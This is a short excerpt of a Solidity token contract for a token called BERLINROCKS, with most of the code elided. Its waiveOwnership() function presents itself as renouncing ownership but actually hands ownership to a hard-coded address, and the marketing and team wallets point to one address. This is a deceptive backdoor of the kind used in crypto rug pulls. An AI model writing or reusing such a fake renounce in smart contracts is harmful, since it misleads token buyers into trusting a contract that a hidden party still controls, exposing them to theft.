...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x39a48bfDb5bf84C191983C583c3eD22071f6b737);
    }
...
contract BERLINROCKS is Context, IERC20, Ownable {
    ...
    string private _name = "BERLINROCKS";
    string private _symbol = "BRLCKS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xdca1195Ed28a21eB52fA2051974f8eCfDE57Cc20);
    address payable public teamWalletAddress = payable(0xdca1195Ed28a21eB52fA2051974f8eCfDE57Cc20);
